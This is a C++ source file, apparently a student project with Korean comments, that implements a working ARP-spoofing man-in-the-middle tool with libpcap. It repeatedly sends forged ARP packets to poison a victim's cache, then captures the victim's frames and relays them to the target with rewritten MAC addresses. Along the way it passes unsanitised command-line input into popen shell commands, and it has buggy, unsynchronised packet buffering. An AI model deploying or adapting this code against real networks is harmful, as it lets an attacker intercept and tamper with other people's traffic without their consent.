//#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
//#include <fstream>
#include <sstream>
#include <algorithm>
//#include <cstdio>
//#include <cstring>
//#include <stdio.h>
//#include <array>
//#include <glog/logging.h>

#include <thread>
#include <chrono>
#include <libnet.h>
#include <queue>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

string cmd(string command) {
    std::string result;
    char buffer[128];
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return "Error: popen failed!";
    }
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }
    pclose(pipe);
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

using MAC = uint8_t[6];
//using MAC = std::array<uint8_t, 6>;
void macFstr(string strMac, MAC &mac){
    //MAC mac;
    std::istringstream iss(strMac);
    iss >> std::hex;
     for (int i = 0; i < 6; ++i) {
        unsigned int val;
        char tmp;
        iss >> val;
        if (i < 5) {
            iss >> tmp;
        }
        mac[i] = static_cast<uint8_t>(val);
    }/*
    for (int i = 0; i < 3; ++i) { //네트워크 바이트 오더로.
        uint8_t temp = mac[i];
        mac[i] = mac[5 - i];
        mac[5 - i] = temp;
    }*/
}


void getMymac(string inter, MAC &mac) {
    string command = "ifconfig " + inter;
    string output = cmd(command);
    istringstream iss(output);

    string line;
    //MAC mac;
    while (getline(iss, line)) {
        auto pos = line.find("ether ");
        if (pos != string::npos) {
            
            string macT = line.substr(pos + 6, 17);
            macFstr(macT, mac);
            //return macFstr(mac);
            //return mac;
        }

    }
    //return mac;
}

string getSmac(string sip, MAC &mac) {
    //MAC mac;
    string command = "arp -n " + sip + " | awk '/" + sip + "/ {print $3}' ";
    string output = cmd(command);
    //mac=macFstr(output);    
    macFstr(output, mac);
    return output;
}

void getTmac(string tip, MAC &mac) {
    string command = "arp -n " + tip + " | awk '/" + tip + "/ {print $3}' ";
    string output = cmd(command);
    macFstr(output, mac);
}

void arpSpoof(string senderIp, string targetIp, string inter) { 
    EthArpPacket packet;

    MAC smac;
    getSmac(senderIp, smac); //sender mac 받아오기
    MAC mymac;
    getMymac(inter, mymac); //Attacker mac(나)

    /*
    for (int i = 0; i < 3; ++i) {
            uint8_t temp = smac[i];
            smac[i] = smac[5 - i];
            smac[5 - i] = temp;
        }
        for (int i = 0; i < 3; ++i) {
            uint8_t temp = mymac[i];
            mymac[i] = mymac[5 - i];
            mymac[5 - i] = temp;
    */

    packet.eth_.dmac_ = smac;//Mac(smac);
    packet.eth_.smac_ = mymac;//Mac(mymac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mymac;//Mac(mymac);
    packet.arp_.sip_ = htonl(Ip(targetIp)); //targetIp
    packet.arp_.tmac_ = smac;//Mac(smac);
    packet.arp_.tip_ = htonl(Ip(senderIp)); //senderIp

    const char* dev = inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    while (1) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        this_thread::sleep_for(std::chrono::seconds(5));//5초 간격으로 스푸핑 때림.    
    }

    pcap_close(handle);
}
queue<pair<const u_char*, size_t>> packets;
void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    size_t siz=pkthdr->caplen;
    packets.push(make_pair(packet, siz));
    cout<<"put one packet to queue"<<endl;
}

void Listen(string inter, string smac) { //스레드2, ip로 필터 걸고 relay호출할것 or 리턴하고 메인에서 릴레이. getSpoofed()
    //LnR (리슨 앤 릴레이)
    const char* dev = inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   
    if (handle == nullptr) {
        std::cerr << "Couldn't open interface eth0: " << errbuf << std::endl;
    }
    string str = "ether src host ";
    str+=smac;
    cout<<str<<endl;
    const char* filter = str.c_str();
    //char filter[100]; // Adjust the buffer size as needed
    //nprintf(filter, sizeof(filter), "ether src host %s", smac);

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "Could not parse filter " << filter << ": " << pcap_geterr(handle) << std::endl;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        std::cerr << "Could not install filter " << filter << ": " << pcap_geterr(handle) << std::endl;
    }
    pcap_loop(handle, 0, packetHandler, nullptr);
}
void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) {
    const char* dev = inter;//inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);//pcap_create(dev, errbuf);
    //pcap_activate(handle);//핸들 활성화.

    while (1) {
        /*
        for (int i = 0; i < 3; ++i) {
            uint8_t temp = targetmac[i];
            targetmac[i] = targetmac[5 - i];
            targetmac[5 - i] = temp;
        }
        for (int i = 0; i < 3; ++i) {
            uint8_t temp = mymac[i];
            mymac[i] = mymac[5 - i];
            mymac[5 - i] = temp;
        }*/
        if (packets.empty()) { //느릴경우 main으로 옮길것.
            this_thread::sleep_for(std::chrono::milliseconds(100));//패킷 큐가 비었을 경우 슬립 1초
            //cout<<"stay....."<<endl;
            continue;
        }
        else {
            u_char* packet = (u_char*)packets.front().first;
            size_t len=packets.front().second;
            packets.pop();
            cout<<"get one packet"<<endl;
            struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
            struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
            
            if (ip_hdr->ip_src.s_addr == htonl(Ip(senderIP))) {//
                //eth_hdr->ether_shost = mymac;
                cout<<"ip is equal  "<<senderIP<<endl;
                memcpy(eth_hdr->ether_shost, mymac, sizeof(MAC));
                printf("my mac : ");
                for(int i=0; i<6; i++)
                    printf("%hhX ", mymac[i]);
                printf("\n");
                //cout<<mymac[0]<<mymac[1]<<mymac[2]<<mymac[3]<<mymac[4]<<mymac[5]<<endl;
                //copy(begin(mymac), end(mymac), begin(eth_hdr->ether_shost));
                //eth_hdr->ether_dhost = targetMac;
               // copy(begin(targetmac), end(targetmac), begin(eth_hdr->ether_dhost));
                memcpy(eth_hdr->ether_dhost, targetmac, sizeof(MAC));

                int res = pcap_sendpacket(handle, packet, len);//체크해야함 sizeof(EthArpPacket)
                if (res != 0)
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                else
                {
                    for (size_t i = 0; i < sizeof(EthArpPacket); ++i)
                        printf("%hhX ", packet[i]);
                    cout<<"\nsend relay"<<endl;
                }
            }
        }
    }

    pcap_close(handle);
}

int main(int argc, char* argv[]) {

    if (argc < 4) {    
        cout<<"why?"<<endl;
	    return 0;
    }
    MAC mac;
    string smac=getSmac(argv[2], mac);
    //char* smac=new char[m.size()+1];
    //strcpy(smac, m.c_str());
    //=&getSmac(argv[2], mac).c_str();// = new char[getSmac(argv[2], mac).c_str()+1];
    //strcpy(smac,getSmac(argv[2], mac).c_str());
    MAC targetmac, mymac;
    getTmac(argv[3], targetmac); //
    getMymac(argv[1], mymac); //Attacker mac(나)

    thread autoArp(arpSpoof, argv[2], argv[3], argv[1]); //s ip, t ip, interface
    thread listener(Listen, argv[1], smac);
    thread relayGo(relay, argv[1], argv[2], targetmac, mymac);
    //relay(char* inter, string senderIP, MAC targetmac, MAC mymac)

    autoArp.detach(); //메인 스레드와 관계없이 돌아감.
    listener.detach();
    relayGo.detach();

    while (true) { //대기 걸어줌
        this_thread::sleep_for(std::chrono::seconds(1));
    }


}

